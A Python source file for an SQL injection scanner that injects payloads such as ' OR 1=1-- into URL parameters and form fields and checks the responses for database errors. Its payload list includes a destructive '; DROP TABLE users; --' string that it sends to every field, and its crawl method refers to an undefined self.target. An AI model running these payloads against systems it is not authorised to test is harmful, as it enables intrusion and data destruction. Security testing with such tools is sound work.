import time
import copy
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode
from scanner_utils import get_session, find_sql_errors
import requests
from bs4 import BeautifulSoup
from crawler import Crawler 


class SQLiScanner:
    def __init__(self, base_url, timeout=5, session=None):
        self.base_url = base_url.rstrip("/")
        self.session = session or get_session()
        self.timeout = timeout
        self.findings = []

        # Common SQL Injection payloads (safe for labs, don’t use on real targets)
        self.payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
            "'; DROP TABLE users; --"  # 
        ]

    
    def crawl(self):

        urls = [self.target]
        forms_by_url = {}

        try:
            response = requests.get(self.target)
            soup = BeautifulSoup(response.text, "html.parser")
            forms = soup.find_all("form")
            form_list = []
            for form in forms:
                inputs = {}
                for inp in form.find_all("input"):
                    name = inp.get("name")
                    value = inp.get("value")
                    if name:
                        inputs[name] = value
                form_data = {
                      "action": form.get("action"),
                    "method": form.get("method", "get"),
                    "inputs": inputs
                }
                form_list.append(form_data)
            forms_by_url[self.target] = form_list
        except Exception as e:
            print(f"[!] Crawling failed: {e}")

        return urls, forms_by_url
    

    def test_url_params(self, url):
        """Test query parameters for SQL injection."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return

        base = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', '', ''))

        for param in params:
            for payload in self.payloads:
                test_params = copy.deepcopy(params)
                test_params[param] = [payload]
                test_url = base + "?" + urlencode(test_params, doseq=True)

                try:
                    r = self.session.get(test_url, timeout=self.timeout)
                    vulnerable, pattern = find_sql_errors(r.text)

                    if vulnerable:
                        self.findings.append({
                            "type": "url_param",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "pattern": pattern
                        })
                except Exception as e:
                    print(f"[!] Request failed for {test_url}: {e}")

                time.sleep(0.1)

    def test_forms(self, forms):
        """Test HTML forms for SQL injection."""
        for page_url, form_list in forms.items():
            for form in form_list:
                action = form.get("action") or page_url
                method = form.get("method", "get").lower()
                inputs = form.get("inputs", {})

                # baseline form data
                form_data = {name: (val if val else "test") for name, val in inputs.items()}

                for field in inputs:
                    for payload in self.payloads:
                        test_data = form_data.copy()
                        test_data[field] = payload

                        try:
                            if method == "post":
                                r = self.session.post(action, data=test_data, timeout=self.timeout)
                            else:
                                r = self.session.get(action, params=test_data, timeout=self.timeout)

                            vulnerable, pattern = find_sql_errors(r.text)

                            if vulnerable:
                                self.findings.append({
                                    "type": "form",
                                    "url": action,
                                    "field": field,
                                    "payload": payload,
                                    "pattern": pattern
                                })
                        except Exception as e:
                            print(f"[!] Form request failed: {e}")

                        time.sleep(0.1)

    def run(self, url_list, form_dict):
        """Run scanner on URLs and forms."""
        for url in url_list:
            self.test_url_params(url)

        self.test_forms(form_dict)
        return self.findings
